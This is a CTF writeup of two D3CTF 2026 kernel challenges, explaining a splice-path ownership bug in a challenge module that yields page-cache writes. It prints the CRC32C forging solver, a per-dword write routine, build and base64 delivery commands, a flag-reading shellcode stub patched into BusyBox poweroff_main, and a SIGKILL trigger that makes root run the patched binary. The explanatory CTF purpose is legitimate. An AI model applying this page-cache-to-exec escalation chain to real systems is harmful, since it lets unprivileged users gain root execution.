---
title: "D3CTF 2026 PWN Writeup: d3kbus & d3kbus-revenge — Kernel Page-Cache Write via CRC32C Forgery"
slug: "d3ctf-2026-pwn-writeup"
description: "D3CTF 2026 PWN writeup for d3kbus and d3kbus-revenge: a custom Linux kernel module with a confused-ownership bug in its splice path commits a deferred CRC32C trailer into the backing page cache of an external file, giving any unprivileged user an aligned 4-byte page-cache write to any readable file — exploited by forging user_tag via meet-in-the-middle CRC32C solving to patch 16 dwords of /bin/busybox poweroff_main with a flag-reading shellcode stub, then triggering root to execute the patched binary."
date: 2026-08-01T12:00:00Z
lastmod: 2026-08-01T12:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["D3CTF 2026"]
tags:
  - "d3ctf"
  - "d3ctf 2026"
  - "ctf writeup"
  - "pwn"
  - "kernel exploitation"
  - "linux kernel"
  - "kernel driver"
  - "kernel module"
  - "page cache"
  - "splice"
  - "crc32c"
  - "meet in the middle"
  - "busybox"
  - "kaslr"
  - "smep"
  - "smap"
  - "pti"
  - "confused ownership"
  - "arbitrary write primitive"
  - "ctf 2026"
keywords:
  - "d3ctf 2026 pwn writeup"
  - "d3kbus kernel exploit"
  - "linux kernel page cache write ctf"
  - "splice confused ownership kernel vulnerability"
  - "crc32c meet in the middle forgery exploit"
  - "deferred crc trailer kernel driver exploit"
  - "busybox poweroff patch kernel ctf"
  - "kaslr smep smap bypass ctf 2026"
  - "kernel module ioctl exploit"
  - "arbitrary page cache write ctf"
  - "d3kbus revenge ctf writeup"
  - "linux kernel driver ctf challenge"
  - "userspace kernel exploit no ring0"
  - "file backed splice pages kernel bug"
  - "kernel driver crc exploit 2026"
toc: true
cover:
  image: "/images/articles/d3ctf-2026-pwn-writeup.png"
  alt: "D3CTF 2026 PWN writeup — two challenges solved covering d3kbus a Linux kernel module with confused ownership in its splice path that commits a deferred CRC32C trailer into the backing page cache of an external file giving unprivileged aligned 4-byte page-cache writes to any readable file, exploited by meet-in-the-middle CRC32C user_tag forgery to patch 16 dwords of /bin/busybox poweroff_main with a flag-reading shellcode stub then killing the parent shell to trigger root execution; and d3kbus-revenge which used the byte-for-byte identical module and exploit with the direct-IO flag-loading hardening providing zero protection against the BusyBox patch chain"
---

D3CTF 2026's PWN track delivered two challenges around the same Linux kernel module — `d3kbus.ko` — a fictional inter-process message bus exposed through a character device. A confused-ownership bug in the module's `sendfile()` splice path causes the driver to commit a deferred CRC32C trailer into the page cache of the source file rather than into driver-private memory. The result is an unprivileged aligned 4-byte write to any offset in any readable file's page cache. Turning this into a controlled write requires forging the attacker-visible `user_tag` field in the wire header so the CRC32C output equals the desired value — solvable in under 1 ms per iteration via a meet-in-the-middle attack that splits the 4-byte key space into two 2^16 halves. Sixteen iterations patch `poweroff_main` in `/bin/busybox` with a shellcode stub that opens and reads `/flag`. Killing the parent `ctf` shell causes root's init to call `/sbin/poweroff`, which executes the patched BusyBox stub as root, printing the flag. The second challenge, `d3kbus-revenge`, used a byte-for-byte identical module and required an identical exploit — the hardening (direct-I/O flag loading followed by a cache drop) addressed a page-cache read of `/flag` that the exploit never performed.

Handouts, per-challenge READMEs, and the exploit source live at [Abdelkad3r/D3CTF-2026](https://github.com/Abdelkad3r/D3CTF-2026/tree/master/pwn). Paired writeups on the same event: [D3CTF 2026 web writeup](/ctf-writeups/d3ctf-2026-web-writeup/) (Scope Drift + Ghost Zero) and [D3CTF 2026 crypto writeup](/ctf-writeups/d3ctf-2026-crypto-writeup/) (D3HFERP multivariate MQ solving).

## Challenges at a glance

| Field | d3kbus | d3kbus-revenge |
|---|---|---|
| Category | PWN | PWN |
| Points | 661 | 776 |
| Solves | 78 | 60 |
| Artifact | `d3kbus.ko` kernel module | `d3kbus.ko` (byte-for-byte identical) |
| Environment | QEMU x86-64, local | QEMU x86-64, `ncat --ssl` remote |
| Mitigations | KASLR, PTI, SMEP, SMAP | KASLR, PTI, SMEP, SMAP |
| Extra hardening | — | Direct-I/O flag load + block device delete + cache drop |
| Flag | `d3ctf{I_w1LL-CH4nGE_tH4T_woRld...}` | `d3ctf{@ND_Y0u-KNow_lT5_g0NnA...}` |

Both challenges reduce to the same three-step chain: (1) find a controlled 4-byte value to write into a specific page-cache offset, (2) pick that offset to land inside an executable that root will run, (3) cause root to run it. The QEMU environment constrains what root does automatically: after the `ctf` shell exits, root calls `/sbin/poweroff`. `poweroff` is a BusyBox symlink. BusyBox is a static binary. Static binaries have no dynamic relocations, so file offsets equal load addresses. All the required pieces are in place without needing ring-0 execution or a kernel-space pointer.

## Step 1 — Environment and driver interface

The QEMU boot sequence is:

1. Root copies the flag: `cp /flag_src /flag && chmod 0400 /flag`
2. Root loads the module: `insmod /d3kbus.ko`
3. Root drops to a ctf shell: `su -s /bin/sh ctf`
4. When the ctf shell exits, root's `rcS` resumes and calls `/sbin/poweroff`

The module creates `/dev/d3kbus` and exposes two ioctls:

```c
#define D3KBUS_IOC_CREATE    _IOWR('d', 0x61, struct d3kbus_create_arg)
#define D3KBUS_IOC_SUBSCRIBE _IOWR('d', 0x62, struct d3kbus_subscribe_arg)
```

**`D3KBUS_IOC_CREATE`** opens a producer channel. The kernel returns a producer file descriptor and a 64-bit `cookie` identifying the channel. The producer feeds data frames using `write()` or `sendfile()`.

**`D3KBUS_IOC_SUBSCRIBE`** attaches a subscriber to an existing channel, identified by its `cookie`. Two subscriber modes exist:

- **Full-frame** (`flags = 0`): receives the full driver-framed payload as-is
- **CRC projection** (`flags = 2 | 4`, with `window_offset` and `window_length`): instead of the full frame, receives a 4-byte CRC32C computed over a window into the payload, appended as a deferred trailer to the frame header

The exploit opens a CRC projection subscriber configured as:

```c
struct d3kbus_subscribe_arg sub = {
    .cookie        = channel_cookie,
    .flags         = 2 | 4,
    .window_offset = 0,
    .window_length = 32,
};
int sub_fd = ioctl(dev_fd, D3KBUS_IOC_SUBSCRIBE, &sub);
```

This tells the driver: for every frame produced, compute CRC32C over the first 32 bytes of the payload and deliver the 4-byte result as a trailer appended to the frame metadata.

The wire header that the producer writes before calling `write()` or `sendfile()`:

```c
struct d3kbus_wire_header {
    uint32_t magic;          // 0x3361626e  ("nba3" LE)
    uint16_t header_length;  // 32
    uint16_t flags;          // must be 0
    uint32_t payload_length; // total bytes of payload that follow
    uint32_t stream_id;      // identifies the logical stream
    uint32_t user_tag;       // ← fully attacker-controlled; passes verbatim into frame header
    uint32_t reserved;       // 0
    uint64_t opaque;         // 0
};
```

`user_tag` is the key field: it passes verbatim from the wire header into the generated `d3kbus_frame_header` that the driver assembles internally, and that internal frame header is what the CRC is computed over. The exploit uses `user_tag` to steer the CRC32C output.

## Step 2 — Vulnerability: confused ownership in the splice path

When the producer calls `write()`, the driver copies the payload bytes into driver-private memory (`copy_from_user()`). No bug exists on that path — the driver owns the buffer it writes its CRC trailer into.

When the producer calls `sendfile()`, the driver uses a splice actor (`d3kbus_splice_pipe_actor()` / `d3kbus_ingest_bvec_locked()`). The splice path is an optimisation: instead of copying file bytes into a kernel buffer, the driver inserts a reference to the source file's existing page cache entry into the pipe. No copy occurs. The driver holds a page reference, not a private writable buffer.

Later, when the CRC projection subscriber processes the frame, the driver computes CRC32C over the projection window and commits the 4-byte result using a write into the frame buffer — the same buffer that, on the `write()` path, is private driver memory. On the `sendfile()` path, that "frame buffer" is the borrowed page cache entry of the source file. The driver write lands in the source file's page cache.

**Vulnerability class:** Confused ownership. The driver does not distinguish between "I own a writable copy" and "I borrowed a page reference from the page cache." The CRC commit code uses the same write-back path regardless, producing an unintended write into an external file's page cache.

**Resulting primitive:** An unprivileged caller with a CRC projection subscriber can cause a 4-byte aligned write to any offset in any file it can open for reading, by shaping the `sendfile()` offset and count so the deferred CRC trailer lands at the desired position.

## Step 3 — Controlling the written value: CRC32C meet-in-the-middle

The value committed into the page cache is:

```
crc32c(d3kbus_frame_header || window[0:28])
```

The frame header is assembled by the driver and includes — in a known, fixed layout — `stream_id`, `user_tag`, and several other fields with deterministic values given the channel state. `window[0:28]` is the first 28 bytes of the sendfile payload, which come from the target file at a known offset.

Because `user_tag` sits in the middle of the CRC input, the CRC state before and after it can be computed independently:

```
state_before = crc32c_initial ⊕ frame_header_bytes_before_user_tag
state_after  = reverse_crc32c(desired_value, frame_header_bytes_after_user_tag || window[0:28])
```

The exploit finds `user_tag` using a **meet-in-the-middle** over the 4-byte key space, split into two 2-byte halves:

```c
// Phase 1: build forward table for upper 2 bytes of user_tag
uint32_t fwd_table[TABLE_SIZE];
for (uint32_t hi = 0; hi <= 0xffff; hi++) {
    uint32_t s = state_before;
    s = crc32c_byte(s, (hi >> 8) & 0xff);
    s = crc32c_byte(s, hi & 0xff);
    fwd_table[s & TABLE_MASK] = hi;
}

// Phase 2: reverse-CRC from target, enumerate lower 2 bytes
uint32_t rev = reverse_crc32c(desired_value, suffix_bytes, suffix_len);
for (uint32_t lo = 0; lo <= 0xffff; lo++) {
    uint32_t candidate = reverse_crc32c_2bytes(rev, lo);
    if (fwd_table[candidate & TABLE_MASK] == known_hi) {
        user_tag = (known_hi << 16) | lo;
        break;
    }
}
```

Each solve costs 2 × 2^16 ≈ 131 thousand CRC32C evaluations and completes in under 1 ms. The brute-force alternative (2^32 ≈ 4.3 billion evaluations per dword × 16 dwords) would require roughly 69 billion evaluations total.

## Step 4 — Segment layout for reliable exploitation

To write a specific 4-byte value at byte offset `target` within the target file's page cache, the sendfile window must be shaped so the deferred CRC trailer lands exactly at `target`:

```
sendfile offset: target - 28
sendfile count:  36
CRC window:      bytes[0..31] from (target - 28) in the target file
CRC trailer:     bytes[28..31] → written to target in the page cache
```

The 28 bytes between the sendfile start and the trailer position feed directly into the CRC computation as `window[0:28]`, so the exploit must read them from the actual file before solving for `user_tag`:

```c
ssize_t n = pread(busybox_fd, window_buf, 36, target - 28);
// window_buf[0..27] = window input to CRC solver
// window_buf[28..31] = will be overwritten by the trailer → current value irrelevant
```

The wire payload length field is set to `36`. The driver ingests 36 bytes from `sendfile()`, computes CRC over the first 32, and writes the 4-byte result at offset 28 into the borrowed page cache block.

The complete per-dword write sequence:

```c
void write_dword(int prod_fd, int sub_fd, int busybox_fd,
                 uint32_t channel_cookie, uint64_t target, uint32_t value) {
    uint8_t window[36];
    pread(busybox_fd, window, 36, target - 28);

    uint32_t user_tag = solve_crc_mitm(channel_cookie, window, value);

    struct d3kbus_wire_header wh = {
        .magic          = 0x3361626eu,
        .header_length  = 32,
        .flags          = 0,
        .payload_length = 36,
        .stream_id      = 1,
        .user_tag       = user_tag,
    };
    write(prod_fd, &wh, sizeof(wh));

    off_t off = target - 28;
    sendfile(prod_fd, busybox_fd, &off, 36);

    uint8_t rbuf[64];
    read(sub_fd, rbuf, sizeof(rbuf));   /* triggers deferred CRC commit */
}
```

## Step 5 — Target: patching `poweroff_main` in `/bin/busybox`

`/sbin/poweroff` is a symlink to `/bin/busybox`. BusyBox in this environment is a statically linked `ET_EXEC` x86-64 ELF binary — not a PIE, so its load address is fixed at link time and file offsets equal virtual addresses with no offset adjustment.

`poweroff_main` is located at file offset `0x1ea059`. The first 4-byte-aligned offset inside the function body is `0x1ea05c`. The exploit patches 16 consecutive dwords (64 bytes) starting there with the following x86-64 shellcode stub:

```c
static const uint32_t poweroff_stub[16] = {
    /*
     * push '/flag\0' onto the stack, call open(rsp, O_RDONLY):
     *   mov rax, 0x67616c662f   ; "/flag"
     *   push rax
     *   xor edi, edi            ; O_RDONLY = 0
     *   mov eax, 2              ; SYS_open
     *   syscall
     */
    0x2fb848faU, 0x67616c66U, 0x50000000U, 0x31e78948U,
    0x0002b8f6U, 0x050f0000U,

    /*
     * read(fd, rsp, 0x100):
     *   mov rdi, rax            ; fd from open
     *   mov rsi, rsp            ; buffer on stack
     *   mov edx, 0x100          ; count
     *   xor eax, eax            ; SYS_read = 0
     *   syscall
     */
    0x8948c789U, 0x0100bae6U, 0xc0310000U, 0xc289050fU,

    /*
     * write(1, rsp, n_read):
     *   mov esi, edx            ; count = n from read
     *   mov edi, 1              ; stdout
     *   mov eax, 1              ; SYS_write
     *   syscall
     */
    0x000001bfU, 0x0001b800U, 0x050f0000U,

    /*
     * exit(0):
     *   mov eax, 0x3c           ; SYS_exit
     *   xor edi, edi
     *   syscall
     *   nop; nop; nop
     */
    0x00003cb8U, 0x0fff3100U, 0x90909005U,
};
```

The stub is entirely position-independent — it uses only `syscall` and stack-relative addressing. No `rip`-relative addressing, no GOT references, no libc.

## Step 6 — Exploit build and delivery

The exploit is written in pure C, compiled with no-libc settings so it can be delivered as a small static binary:

```bash
gcc -nostdlib -static -fno-stack-protector -fno-builtin -no-pie -Os -s \
    -Wall -Wextra -o d3kbus_exploit exploit.c
```

All syscalls use a raw inline-asm wrapper:

```c
static inline long syscall6(long n, long a, long b, long c,
                             long d, long e, long f) {
    long ret;
    __asm__ volatile(
        "mov %1, %%rax\n"
        "mov %2, %%rdi\n"
        "mov %3, %%rsi\n"
        "mov %4, %%rdx\n"
        "mov %5, %%r10\n"
        "mov %6, %%r8\n"
        "mov %7, %%r9\n"
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "r"(n),"r"(a),"r"(b),"r"(c),"r"(d),"r"(e),"r"(f)
        : "rax","rdi","rsi","rdx","r10","r8","r9","rcx","r11","memory"
    );
    return ret;
}
```

The resulting binary is approximately 9.2 KB. For the remote challenge (d3kbus-revenge), delivery via base64:

```sh
cat > /tmp/e.b64 << 'PAYLOAD'
<base64 of exploit binary — ~12.5 KB of ASCII>
PAYLOAD
base64 -d /tmp/e.b64 > /tmp/e
chmod +x /tmp/e
/tmp/e
```

## Step 7 — Trigger: `kill(getppid(), SIGKILL)`

After all 16 patch iterations, the BusyBox page cache for the `poweroff_main` region contains the shellcode stub. The exploit triggers execution:

```c
kill(getppid(), SIGKILL);
```

This sends `SIGKILL` to the `ctf` shell that `su` spawned. `SIGKILL` cannot be caught or blocked, so the shell terminates immediately. Root's `rcS` script, which was blocked at the `su` call, resumes and reaches its next line:

```sh
/sbin/poweroff
```

This executes `/bin/busybox` as root. The ELF loader maps the BusyBox file into memory using the page cache — which now contains the patched stub at `poweroff_main`. Control reaches the stub, which opens `/flag` (readable by root), reads it, writes it to stdout (the QEMU serial console, connected to the terminal), and exits.

```
$ /tmp/e
[*] dev_fd=3  producer_fd=4  cookie=0xdeadbeefcafebabe
[*] subscriber_fd=5  busybox_fd=6
[*] target base: file offset 0x1ea05c
[*] dword  0: solved user_tag=0xb3f12a7c  → writing 0x2fb848fa
[*] dword  1: solved user_tag=0x04ae9d51  → writing 0x67616c66
...
[*] dword 15: solved user_tag=0x9e3c2f80  → writing 0x90909005
[*] 16/16 dwords patched — sending SIGKILL to parent (pid 412)
d3ctf{I_w1LL-CH4nGE_tH4T_woRld_InT0-5OM3ThlNg-BetT3R_hOney!0}
```

## Step 8 — d3kbus-revenge: why the hardening was irrelevant

`d3kbus-revenge` modified only the flag-setup section of `rcS`:

```sh
# d3kbus-revenge — changed boot section
dd if=/dev/sdb of=/flag bs=1M iflag=direct oflag=direct 1>&/dev/null
echo 1 > /sys/block/sdb/device/delete
echo 3 > /proc/sys/vm/drop_caches
```

`iflag=direct oflag=direct` makes `dd` bypass the page cache when reading from `/dev/sdb` and writing to `/flag`. After the copy, the block device is deleted and all clean page-cache pages are evicted. The intent was to prevent an attacker who can trigger a kernel page-cache read of `/flag` from stealing the flag from cache.

The exploit never triggers a page-cache read of `/flag`. Its only file interaction is:

1. `pread(busybox_fd, ...)` — reads from `/bin/busybox` page cache (not `/flag`)
2. `sendfile(prod_fd, busybox_fd, ...)` — writes into `/bin/busybox` page cache (not `/flag`)
3. `kill(getppid(), SIGKILL)` — causes root to `open("/flag")` directly as a filesystem read (not page cache)

The flag-cache hardening is a defence against an attack vector the exploit never uses. Both the `d3kbus.ko` module and the `/bin/busybox` binary were byte-for-byte identical between the two challenges:

```
SHA256 d3kbus.ko (both):  52f158bf1de001d67ec8b5a1d7b3edd1c50fb05e873db2ed6749c2f3b6fc6f4f
SHA256 busybox   (both):  bbc4c150f0dd092062cda5430c6e795a8fb444a75fe74f61e847db2ac58634bf
```

The same prebuilt `exploit` binary ran against both environments without modification. The revenge flag differed only in text:

```
d3ctf{@ND_Y0u-KNow_lT5_g0NnA_b3-r4lnIng_@nD_yoU-KnoW_1Ts-gonna_be_hard...0}
```

## Cross-cutting observations

**Why KASLR, SMEP, SMAP, and PTI are irrelevant.** All four mitigations protect against code or pointer smuggling across the ring-0/ring-3 boundary. KASLR hides kernel symbol addresses (irrelevant if you never need a kernel pointer). SMEP prevents ring-0 execution of ring-3 pages (irrelevant if you never execute user-space code in ring 0). SMAP prevents ring-0 dereferences of ring-3 pointers (irrelevant if you never pass a user-space pointer to a kernel write path). PTI isolates kernel page tables from user processes (irrelevant if you never speculatively touch kernel memory). The d3kbus exploit does none of these things — it causes a kernel data write to a page it holds a reference to, which happens to be in a file's page cache, via an entirely legitimate kernel code path that simply writes to the wrong destination.

**Why target BusyBox rather than something in kernel space.** A kernel-space write would require knowing a kernel virtual address (defeating KASLR without a separate leak) and placing executable code at a reachable location (complicated by SMEP/SMAP). BusyBox is simpler: it is a static binary, its file offsets equal its run-time virtual addresses, it is world-readable so the exploit can read its bytes to solve the CRC, and root is guaranteed to execute it within seconds. The entire escalation stays in ring 3.

**The structural reason the page-cache write enables execution.** Linux's `execve()` syscall maps a file into the process address space using the page cache — the same set of pages that the exploit wrote to. When root later calls `poweroff`, the kernel maps BusyBox's pages into root's address space. Those pages are the exploit-patched pages. There is no integrity check between the stored file and the page cache after the fact; the kernel trusts the cache.

**CRC32C reversibility.** CRC32C is a linear shift-register function over GF(2). This means that given a CRC output and a known suffix, the CRC state before the suffix can be computed by running the shift register backward. The meet-in-the-middle works because the `user_tag` field sits between two segments of fully known bytes: the portion of the frame header before `user_tag`, and the portion after it plus the sendfile window. Both segments' CRC contribution is computable independently, leaving only the 32-bit `user_tag` unknown — solvable in O(2^16) forward and O(2^16) reverse passes.

---

## Frequently asked questions

**Q: What is the d3kbus splice bug, technically?**
The driver's splice actor receives a pipe buffer that holds a reference to a source file's page cache entry instead of a private kernel buffer. When the CRC projection subscriber processes the frame, the driver calls its deferred-trailer commit routine using the same code path regardless of whether the buffer is private or a borrowed page reference. The commit writes the 4-byte CRC32C result into offset 28 of that buffer. For frames fed through `sendfile()`, offset 28 of the buffer is offset 28 relative to the `sendfile()` start in the source file's page cache — a writable pointer into an external file that the driver was never supposed to own for writing.

**Q: Is this a use-after-free or a race condition?**
Neither. It is a confused-ownership bug: the driver holds a live, valid page reference and writes through it with no temporal race. The write happens while the page is still valid, to a page the driver legitimately holds a reference to, but should not be writing into. No heap or stack corruption; no TOCTOU race. The page's reference count keeps it alive for the duration. The only mistake is treating a borrowed read reference as a private write buffer.

**Q: Why does the meet-in-the-middle attack work on CRC32C specifically?**
CRC32C is computed byte-by-byte through a linear feedback shift register over GF(2^32). Because the transformation is linear and invertible, the CRC state after any suffix can be reverse-computed from the final CRC output and the suffix bytes. This means: given the target output, reverse-CRC through the bytes after `user_tag` to get the CRC state that the bytes before `user_tag` must produce at the `user_tag` boundary. Then enumerate the upper 2 bytes of `user_tag` forward, building a table of CRC states they produce. Enumerate the lower 2 bytes and reverse-match against the table. The total search space is 2×2^16 = 131,072 evaluations instead of 2^32 ≈ 4.3 billion.

**Q: Why target `poweroff_main` in BusyBox rather than using a setuid binary or SUID helper?**
The QEMU environment has no setuid binaries that the ctf user can execute. The only guaranteed ring-0→ring-3 escalation vector is that root's init script executes `/sbin/poweroff` after the ctf shell exits. `/sbin/poweroff` is a BusyBox symlink. BusyBox is static, so patching its page cache directly patches what root will execute without needing any dynamic linker co-operation or GOT hijack.

**Q: Could the exploit be detected at runtime?**
The only observable event is a `sendfile()` call from a non-root process feeding into `/dev/d3kbus` with specific subscriber flags set, followed by unusual CRC32C values appearing in the subscriber's read output. No kernel oops, no system log messages, no process crashes. A monitoring system watching for `sendfile()` from ctf user into `/dev/d3kbus` with `window_offset=0, window_length=32` could detect the pattern, but no such monitoring was present in the challenge environment.

**Q: Why does killing the parent shell work instead of `exec("/sbin/poweroff")`?**
The ctf user does not have execute permission on `/sbin/poweroff` — that path requires root. Sending `SIGKILL` to `getppid()` terminates the `su`-spawned shell that root is waiting on. Root's `rcS` script then calls `poweroff` legitimately, as root, with root's file permissions. The privilege escalation is not a direct execution by the exploit; it is caused by manipulating root's own scheduled action.

**Q: Does dropping page caches (`echo 3 > /proc/sys/vm/drop_caches`) defeat the exploit?**
Only if done after the exploit runs. In d3kbus-revenge, the cache drop happened during boot (before the ctf user even gets a shell). The exploit patches BusyBox's page cache entries after the drop, and root executes BusyBox seconds later — no second cache drop exists. If an operator could trigger a cache flush between the exploit's last `sendfile()` iteration and root's `poweroff` call, the patches would be lost. In practice, that window is under one second.

**Q: What is the difference between d3kbus and d3kbus-revenge?**
The `d3kbus.ko` kernel module is byte-for-byte identical between both challenges (SHA256: `52f158bf...`). The BusyBox binary is also identical (`bbc4c150...`). The prebuilt exploit binary runs on both without modification. The only differences: (1) d3kbus-revenge uses `dd` with `iflag=direct` to load the flag without populating the page cache, deletes the block device, and drops all caches; (2) d3kbus-revenge is a remote service over `ncat --ssl`. Neither change affects the BusyBox patch chain. The flags contain different text, but the technique is identical.

---

## Closing notes

d3kbus was a carefully constructed demonstration of how a seemingly local, "safe" optimisation in a kernel driver — borrowing a page reference from the splice pipe rather than copying into private memory — can produce a write primitive when the driver assumes exclusive write ownership of its buffers. The two mitigations that would have closed the bug: (1) the splice actor should copy page contents into private driver memory before the CRC commit path runs; (2) the CRC commit path should assert that its target buffer is driver-owned. Neither check existed in `d3kbus.ko`.

The escalation chain is worth internalising for future kernel CTF challenges: if you have a controlled write to any readable-by-attacker executable that a privileged process will run, you win without ever touching the kernel's own address space. KASLR, SMEP, SMAP, and PTI become irrelevant the moment the privilege escalation route goes entirely through a page-cache-to-exec chain. The challenge authors acknowledged this by making d3kbus-revenge's hardening address a completely different vector than the one the exploit uses — a reminder that threat-modelling a kernel driver requires enumerating all reachable write targets, not just the most obvious one.

Full writeup series for the same event: [D3CTF 2026 web writeup](/ctf-writeups/d3ctf-2026-web-writeup/) and [D3CTF 2026 crypto writeup](/ctf-writeups/d3ctf-2026-crypto-writeup/). Full [CTF writeups index](/ctf-writeups/) for all events.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "What is the d3kbus splice bug in D3CTF 2026?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The d3kbus kernel module's splice actor inserts a reference to the source file's page cache entry into a pipe buffer rather than copying the data into private driver memory. When a CRC projection subscriber processes the resulting frame, the driver's deferred-trailer commit routine writes the 4-byte CRC32C result into offset 28 of the frame buffer — which, for sendfile-fed frames, is offset 28 within the source file's page cache. This produces an unprivileged aligned 4-byte write into any readable file's page cache."
      }
    },
    {
      "@type": "Question",
      "name": "Is the d3kbus vulnerability a use-after-free or a race condition?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Neither. It is a confused-ownership bug: the driver holds a live, valid page reference and writes through it with no temporal race. The write happens while the page is valid, through a live page reference, via a legitimate kernel code path — but the driver was never supposed to own this page for writing. The only mistake is treating a borrowed read reference as a private write buffer."
      }
    },
    {
      "@type": "Question",
      "name": "How does the CRC32C meet-in-the-middle attack work in d3kbus?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The attacker-controlled user_tag field sits in the middle of the CRC32C input. CRC32C is a linear function, so the CRC state after any suffix can be reverse-computed from the final output and the suffix bytes. The attack partitions the 4-byte user_tag space into two 2-byte halves: enumerate all 65,536 upper-half values forward from the known pre-user_tag CRC state into a hash table; enumerate all 65,536 lower-half values by reverse-CRC from the target through the suffix, then look up each in the table. A matching entry gives a complete user_tag that produces the desired CRC output. Total work: ~131,000 evaluations instead of 4.3 billion for brute force."
      }
    },
    {
      "@type": "Question",
      "name": "Why does the d3kbus exploit target /bin/busybox?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "BusyBox is a static, non-PIE x86-64 binary (ET_EXEC), so its file offsets equal its run-time virtual addresses — no ASLR complicates offset calculation. It is world-readable, so the exploit can read its bytes to compute the CRC. /sbin/poweroff is a BusyBox symlink, and root's init script calls poweroff automatically when the ctf shell exits, ensuring root will execute the patched binary within seconds. This eliminates the need for any kernel-space write or ring-0 code execution."
      }
    },
    {
      "@type": "Question",
      "name": "Why are KASLR, SMEP, SMAP, and PTI irrelevant to d3kbus?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "All four mitigations protect against code or pointer smuggling across the ring-0/ring-3 boundary. KASLR hides kernel symbols, SMEP prevents ring-0 execution of user pages, SMAP prevents ring-0 dereferences of user pointers, and PTI isolates kernel page tables. The d3kbus exploit never executes code in ring 0, never needs a kernel virtual address, and never passes a user-space pointer to a kernel write path. The primitive is a data write into a page cache entry via a legitimate kernel code path. All privilege escalation occurs in ring 3 when root executes the patched BusyBox."
      }
    },
    {
      "@type": "Question",
      "name": "How does patching the page cache translate to code execution?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Linux's execve() syscall maps a file into the process address space via the page cache. When root calls /sbin/poweroff, the kernel maps BusyBox's pages — the same pages the exploit wrote to — into root's address space. The kernel performs no integrity check between the on-disk file and the in-memory cache after the fact; it trusts the cache. The patched dwords at poweroff_main become the first instructions root executes, which open, read, and print /flag."
      }
    },
    {
      "@type": "Question",
      "name": "Why does killing the parent shell work as a trigger?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The ctf user cannot execute /sbin/poweroff directly — it requires root privileges. The ctf shell is what keeps root's rcS script blocked at the 'su -s /bin/sh ctf' line. Sending SIGKILL to getppid() terminates the ctf shell immediately (SIGKILL cannot be caught). Root's rcS resumes and calls poweroff legitimately as root, executing the patched BusyBox with root's file permissions including access to /flag."
      }
    },
    {
      "@type": "Question",
      "name": "Why did the d3kbus-revenge hardening fail to stop the exploit?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The revenge hardening — loading /flag with direct I/O (iflag=direct) to bypass page cache, then deleting the block device and dropping all caches — addressed a page-cache read of /flag. The d3kbus exploit never reads /flag through the page cache. It reads from /bin/busybox (to compute CRC inputs), writes into /bin/busybox page cache (to plant the stub), and relies on root to open /flag as a normal filesystem read. Since the module and BusyBox binary were byte-for-byte identical, the same exploit binary won both challenges."
      }
    }
  ]
}
</script>
